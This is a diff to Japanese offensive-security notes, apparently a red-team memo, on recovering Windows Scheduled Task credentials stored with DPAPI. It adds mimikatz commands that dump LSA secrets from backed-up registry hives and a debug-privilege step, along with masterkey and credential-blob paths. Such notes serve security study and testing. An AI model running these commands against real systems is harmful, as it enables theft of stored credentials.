@@ -60,8 +60,22 @@ DCに保存されているbackupkeyでmasterkeyを復号可能。
 ---
 
 ### ScheduledTask
-Scheduled Taskの認証情報はDPAPIを使って保存されてる。
-masterkeyはLSASSの中にあるので、それを取って使う。
+
+Scheduled Taskの認証情報はDPAPIを使って保存されてる。  
+```
+# masterkey
+C:\System32\Microsoft\Protect\S-1-5-18\User
+1. LSASSにmasterkeyの平文がキャッシュされているものを取り出す
+2. LSA Secretsに保存されているDPAPI_SYSTEMを使って復号する
+
+# DPAPI_SYSTEM
+mimikatz # lsadump::secrets /system:c:\backup\SYSTEM /security:c:\backup\SECURITY
+
+# blob
+C:\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\AA10EB8126AA20883E9542812A0F904C
+```
+
+masterkeyのcacheがLSASSの中にあるので、それを取って使う。
 
 ```
 mimikatz # privilege::debug
